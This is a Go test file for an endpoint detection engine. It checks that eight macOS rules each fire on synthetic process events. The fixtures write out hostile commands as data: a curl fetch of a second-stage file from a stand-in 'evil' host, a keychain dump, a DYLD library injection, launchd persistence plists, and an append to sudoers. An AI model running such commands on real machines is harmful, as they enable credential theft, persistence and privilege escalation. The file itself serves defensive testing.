package rules

import (
	"encoding/json"
	"log/slog"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/detection"
	"github.com/fleetdm/edr/server/store"
)

// TestAllRulesWireUpAndFire proves the Phase 2 "detection pack" works as a single engine:
// register every production rule, feed a single event batch that exercises each rule
// exactly once, and assert we get a finding per rule with the expected severity. This is
// the one test that catches regressions where a rule dev silently stops registering, or
// where a shared helper gets a breaking edit that only shows up when the rules are run
// together.
func TestAllRulesWireUpAndFire(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	hostA := "11111111-1111-1111-1111-111111111111"
	hostB := "22222222-2222-2222-2222-222222222222"

	// Event batch covering every rule's positive case:
	//   - suspicious_exec: python -> /bin/sh -> /tmp/payload (host A)
	//   - persistence_launchagent: bash -> /bin/launchctl load ~/Library/LaunchAgents (host A)
	//   - dyld_insert: ls with DYLD_INSERT_LIBRARIES= prefix (host A)
	//   - shell_from_office: Microsoft Word -> /bin/bash (host B)
	//   - osascript_network_exec: osascript -> curl + /tmp/stage2 (host A)
	//   - credential_keychain_dump: /usr/bin/security dump-keychain (host A)
	//   - privilege_launchd_plist_write: non-platform-binary writes
	//     /Library/LaunchDaemons/com.evil.persistence.plist (host A)
	//   - sudoers_tamper: non-allowlisted writer opens /etc/sudoers.d/evil (host A)
	events := []store.Event{
		// Chain 1: suspicious_exec (python → sh → /tmp/payload)
		{EventID: "fork-py", HostID: hostA, TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-py", HostID: hostA, TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/python3","args":["py","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: hostA, TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: hostA, TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/bin/sh","args":["sh","-c","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-pld", HostID: hostA, TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":100}`)},
		{EventID: "exec-pld", HostID: hostA, TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":100,"path":"/tmp/payload","args":["/tmp/payload"],"uid":501,"gid":20}`)},

		// Chain 2: persistence_launchagent
		{EventID: "fork-bashpla", HostID: hostA, TimestampNs: 4000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":300,"parent_pid":1}`)},
		{EventID: "exec-bashpla", HostID: hostA, TimestampNs: 4100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":300,"ppid":1,"path":"/bin/bash","args":["bash"],"uid":501,"gid":20}`)},
		{EventID: "fork-lctl", HostID: hostA, TimestampNs: 5000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":400,"parent_pid":300}`)},
		{EventID: "exec-lctl", HostID: hostA, TimestampNs: 5100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":400,"ppid":300,"path":"/bin/launchctl","args":["launchctl","load","/Users/alice/Library/LaunchAgents/com.evil.plist"],"uid":501,"gid":20}`)},

		// Chain 3: dyld_insert — standalone ls with DYLD_* env prefix
		{EventID: "fork-dyld", HostID: hostA, TimestampNs: 6000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":500,"parent_pid":1}`)},
		{EventID: "exec-dyld", HostID: hostA, TimestampNs: 6100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":500,"ppid":1,"path":"/bin/ls","args":["DYLD_INSERT_LIBRARIES=/tmp/x.dylib","/bin/ls"],"uid":501,"gid":20}`)},

		// Chain 4: osascript_network_exec (osa → curl + /tmp/stage2)
		{EventID: "fork-osa", HostID: hostA, TimestampNs: 7000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":600,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: hostA, TimestampNs: 7100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":600,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-osa-curl", HostID: hostA, TimestampNs: 7500, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":700,"parent_pid":600}`)},
		{EventID: "exec-osa-curl", HostID: hostA, TimestampNs: 7600, EventType: "exec",
			Payload: json.RawMessage(`{"pid":700,"ppid":600,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil"],"uid":501,"gid":20}`)},
		{EventID: "fork-osa-s2", HostID: hostA, TimestampNs: 8000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":800,"parent_pid":600}`)},
		{EventID: "exec-osa-s2", HostID: hostA, TimestampNs: 8100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":800,"ppid":600,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},

		// Chain 5: shell_from_office (Microsoft Word → /bin/bash) on host B
		{EventID: "fork-word", HostID: hostB, TimestampNs: 9000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":900,"parent_pid":1}`)},
		{EventID: "exec-word", HostID: hostB, TimestampNs: 9100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":900,"ppid":1,"path":"/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word","args":["Word"],"uid":501,"gid":20}`)},
		{EventID: "fork-wordbash", HostID: hostB, TimestampNs: 10000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":1000,"parent_pid":900}`)},
		{EventID: "exec-wordbash", HostID: hostB, TimestampNs: 10100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":1000,"ppid":900,"path":"/bin/bash","args":["bash"],"uid":501,"gid":20}`)},

		// Chain 6: credential_keychain_dump (security dump-keychain) on host A
		{EventID: "fork-sec", HostID: hostA, TimestampNs: 11000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":1100,"parent_pid":1}`)},
		{EventID: "exec-sec", HostID: hostA, TimestampNs: 11100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":1100,"ppid":1,"path":"/usr/bin/security","args":["security","dump-keychain"],"uid":501,"gid":20}`)},

		// Chain 7: privilege_launchd_plist_write (non-platform binary writes
		// /Library/LaunchDaemons/<x>.plist with O_WRONLY|O_CREAT|O_TRUNC)
		{EventID: "fork-ldp", HostID: hostA, TimestampNs: 12000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":1200,"parent_pid":1}`)},
		{EventID: "exec-ldp", HostID: hostA, TimestampNs: 12100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":1200,"ppid":1,"path":"/tmp/dropper","args":["/tmp/dropper"],"uid":0,"gid":0,"code_signing":{"team_id":"EVILCORP1","signing_id":"com.evil.dropper","flags":0,"is_platform_binary":false}}`)},
		{EventID: "open-ldp", HostID: hostA, TimestampNs: 12200, EventType: "open",
			Payload: json.RawMessage(`{"pid":1200,"path":"/Library/LaunchDaemons/com.evil.persistence.plist","flags":1537}`)},

		// Chain 8: sudoers_tamper — non-allowlisted writer opens
		// /etc/sudoers.d/<x> in write mode. Renumbered from "Chain 7"
		// during the merge with PR #38; the launchd-plist chain landed
		// at the same slot first, so this one moves to PID 1300 /
		// TimestampNs 13000 to keep the time/PID space disjoint.
		{EventID: "fork-sud", HostID: hostA, TimestampNs: 13000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":1300,"parent_pid":1}`)},
		{EventID: "exec-sud", HostID: hostA, TimestampNs: 13100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":1300,"ppid":1,"path":"/bin/bash","args":["bash","-c","echo evil >> /etc/sudoers.d/evil"],"uid":0,"gid":0}`)},
		{EventID: "open-sud", HostID: hostA, TimestampNs: 13200, EventType: "open",
			Payload: json.RawMessage(`{"pid":1300,"path":"/etc/sudoers.d/evil","flags":1537}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	engine := detection.NewEngine(s, slog.Default())
	engine.Register(&SuspiciousExec{})
	engine.Register(&PersistenceLaunchAgent{})
	engine.Register(&DyldInsert{})
	engine.Register(&ShellFromOffice{})
	engine.Register(&OsascriptNetworkExec{})
	engine.Register(&CredentialKeychainDump{})
	engine.Register(&PrivilegeLaunchdPlistWrite{})
	engine.Register(&SudoersTamper{})
	require.NoError(t, engine.Evaluate(ctx, events))

	// Each rule should have produced at least one alert. We query by rule_id rather than
	// by count because some rules (suspicious_exec) can legitimately fire on multiple
	// chains if our fixtures overlap — we only care that no rule was silently skipped.
	wantRules := map[string]string{
		"suspicious_exec":               "high",
		"persistence_launchagent":       "high",
		"dyld_insert":                   "high",
		"shell_from_office":             "high",
		"osascript_network_exec":        "critical",
		"credential_keychain_dump":      "high",
		"privilege_launchd_plist_write": "high",
		"sudoers_tamper":                "high",
	}

	alerts, err := s.ListAlerts(ctx, store.AlertFilter{})
	require.NoError(t, err)
	gotBy := map[string]string{}
	for _, a := range alerts {
		gotBy[a.RuleID] = a.Severity
	}
	for rule, severity := range wantRules {
		assert.Equal(t, severity, gotBy[rule], "rule %q missing or wrong severity", rule)
	}
	assert.GreaterOrEqual(t, len(alerts), len(wantRules),
		"every registered rule should have fired at least once")
}
